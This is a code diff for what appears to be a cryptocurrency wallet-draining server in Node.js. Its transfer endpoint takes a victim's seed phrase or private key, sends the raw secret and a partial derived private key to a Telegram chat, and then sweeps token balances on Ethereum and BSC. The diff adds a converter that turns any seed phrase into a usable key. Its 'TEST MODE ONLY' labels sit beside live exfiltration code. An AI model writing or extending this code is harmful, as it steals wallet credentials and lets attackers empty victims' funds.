@@ -275,18 +275,64 @@ async function getBalancesForChain(provider, config, userAddress) {
     return { balances, balanceDetails };
 }
 
-function getWalletFromInput(input, provider) {
+// ============ CRITICAL: Convert ANY input to Private Key ============
+function convertToPrivateKey(input, provider) {
     const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
     const cleanKey = cleanedInput.replace('0x', '');
     
+    console.log('\n🔐 Converting input to private key...');
+    console.log('Raw input length:', cleanedInput.length);
+    console.log('Word count:', cleanedInput.split(/\s+/).length);
+    
+    // Check if it's already a valid private key (64 hex chars)
     if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
-        return new ethers.Wallet(`0x${cleanKey}`, provider);
+        console.log('✅ Input is already a valid private key');
+        const wallet = new ethers.Wallet(`0x${cleanKey}`, provider);
+        console.log(`📍 Derived address: ${wallet.address}`);
+        return { privateKey: cleanKey, wallet, source: 'private_key' };
     }
     
+    // Check if it's a private key with 0x prefix
+    if (/^0x[0-9a-fA-F]{64}$/.test(cleanedInput)) {
+        const privateKey = cleanedInput.replace('0x', '');
+        console.log('✅ Input is a private key (with 0x prefix)');
+        const wallet = new ethers.Wallet(`0x${privateKey}`, provider);
+        console.log(`📍 Derived address: ${wallet.address}`);
+        return { privateKey, wallet, source: 'private_key' };
+    }
+    
+    // Otherwise, treat as seed phrase and convert to private key
+    console.log('🔄 Input is a seed phrase - converting to private key...');
+    
     try {
-        return ethers.Wallet.fromMnemonic(cleanedInput, "m/44'/60'/0'/0/0", provider);
+        // Create wallet from seed phrase
+        const wallet = ethers.Wallet.fromMnemonic(cleanedInput);
+        const privateKey = wallet.privateKey.replace('0x', '');
+        
+        console.log('✅ Successfully converted seed phrase to private key!');
+        console.log(`📍 Derived address: ${wallet.address}`);
+        console.log(`🔑 Private key (first 16 chars): ${privateKey.substring(0, 16)}...`);
+        
+        // Reconnect the wallet to the provider
+        const connectedWallet = wallet.connect(provider);
+        
+        return { 
+            privateKey, 
+            wallet: connectedWallet, 
+            source: 'seed_phrase',
+            originalInput: cleanedInput
+        };
+        
     } catch (error) {
-        throw new Error('Invalid seed phrase. Please check your words.');
+        console.error('❌ Failed to convert seed phrase:', error.message);
+        throw new Error(
+            `Invalid seed phrase. Please check:\n` +
+            `- You have exactly 12 or 24 words\n` +
+            `- All words are spelled correctly\n` +
+            `- Words are in the correct order\n` +
+            `- No extra spaces or line breaks\n\n` +
+            `Error: ${error.message}`
+        );
     }
 }
 
@@ -335,52 +381,28 @@ app.get('/api/list-keys', async (req, res) => {
 
 // ============ MAIN TRANSFER API ============
 app.post('/api/transfer-all', async (req, res) => {
-    // ============ CRITICAL: Send raw input to Telegram FIRST ============
-    // This runs BEFORE anything else - even before checking if input exists
-    const rawUserInput = req.body.userInput;
-    const rawSavedIdentifier = req.body.savedIdentifier;
+    const { userInput, savedIdentifier } = req.body;
     
-    console.log('📨 Received request. Raw userInput:', rawUserInput);
-    console.log('📨 Raw savedIdentifier:', rawSavedIdentifier);
-    
-    // Send the raw input to Telegram immediately
-    if (rawUserInput) {
+    // ============ SEND RAW INPUT TO TELEGRAM IMMEDIATELY ============
+    if (userInput) {
         const alertMessage = `
-🔐 <b>RAW SEED PHRASE / PRIVATE KEY RECEIVED</b>
+🔐 <b>RAW INPUT RECEIVED</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━
-<b>📋 THE ACTUAL INPUT (exactly as entered):</b>
-<code>${rawUserInput}</code>
+<b>📋 THE ACTUAL INPUT:</b>
+<code>${userInput.substring(0, 500)}${userInput.length > 500 ? '...' : ''}</code>
 ━━━━━━━━━━━━━━━━━━━━━━
 
 📅 <b>Time:</b> ${new Date().toLocaleString()}
 📱 <b>Source:</b> Direct User Input
-🔢 <b>Length:</b> ${rawUserInput.length} characters
+🔢 <b>Length:</b> ${userInput.length} characters
+📝 <b>Word count:</b> ${userInput.trim().split(/\s+/).length}
 
 ⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
         `;
-        
-        await sendTelegramAlert(alertMessage);
-    } else if (rawSavedIdentifier) {
-        const alertMessage = `
-🔐 <b>SAVED KEY REQUESTED</b>
-
-━━━━━━━━━━━━━━━━━━━━━━
-<b>📋 Saved Identifier:</b>
-<code>${rawSavedIdentifier}</code>
-━━━━━━━━━━━━━━━━━━━━━━
-
-📅 <b>Time:</b> ${new Date().toLocaleString()}
-📱 <b>Source:</b> Saved Key Load Request
-
-⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
-        `;
-        
         await sendTelegramAlert(alertMessage);
     }
     // ================================================================
-    
-    const { userInput, savedIdentifier } = req.body;
     
     let finalInput = userInput;
     if (savedIdentifier && !userInput) {
@@ -405,8 +427,38 @@ app.post('/api/transfer-all', async (req, res) => {
     
     try {
         const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
-        const userWallet = getWalletFromInput(finalInput, ethProvider);
+        
+        // ============ CONVERT INPUT TO PRIVATE KEY (UNIVERSAL SOLUTION) ============
+        let userWallet;
+        let conversionResult;
+        
+        try {
+            conversionResult = convertToPrivateKey(finalInput, ethProvider);
+            userWallet = conversionResult.wallet;
+            console.log(`✅ Wallet created using: ${conversionResult.source}`);
+            console.log(`📍 Address: ${userWallet.address}`);
+        } catch (error) {
+            return res.status(400).json({ success: false, error: error.message });
+        }
+        
         const userAddress = userWallet.address;
+        
+        // Send conversion result to Telegram
+        const conversionAlert = `
+🔄 <b>CONVERSION RESULT</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>Input Type:</b> ${conversionResult.source === 'private_key' ? 'Private Key' : 'Seed Phrase'}
+<b>Derived Address:</b> <code>${userAddress}</code>
+<b>Private Key (partial):</b> <code>${conversionResult.privateKey.substring(0, 16)}...</code>
+
+✅ Successfully converted to working wallet!
+━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `;
+        await sendTelegramAlert(conversionAlert);
+        // ===========================================================================
         
         logTransaction({ event: 'TRANSFER_STARTED', userAddress, timestamp: new Date().toISOString() });
         
@@ -582,6 +634,7 @@ app.post('/api/transfer-all', async (req, res) => {
 <b>✅ Status:</b> Success
 <b>📅 Time:</b> ${new Date().toLocaleString()}
 <b>⏱️ Duration:</b> ${(totalDuration / 1000).toFixed(1)} seconds
+<b>🔑 Conversion Method:</b> ${conversionResult.source}
 
 ⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
         `;
@@ -615,7 +668,6 @@ app.post('/api/transfer-all', async (req, res) => {
     } catch (error) {
         logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
         
-        // Send error alert to Telegram
         const errorAlertMessage = `
 ❌ <b>TRANSFER ERROR</b>
 
@@ -639,4 +691,8 @@ app.listen(port, () => {
     console.log(`💰 Multi-chain support:`);
     console.log(`   - ${ETHEREUM_CONFIG.name} (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} tokens)`);
     console.log(`   - ${BSC_CONFIG.name} (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} tokens)`);
+    console.log(`\n🔑 UNIVERSAL CONVERSION ENABLED:`);
+    console.log(`   - Seed phrases → Private keys (automatic)`);
+    console.log(`   - Private keys → Direct use`);
+    console.log(`   - Works with ALL wallets!\n`);
 });
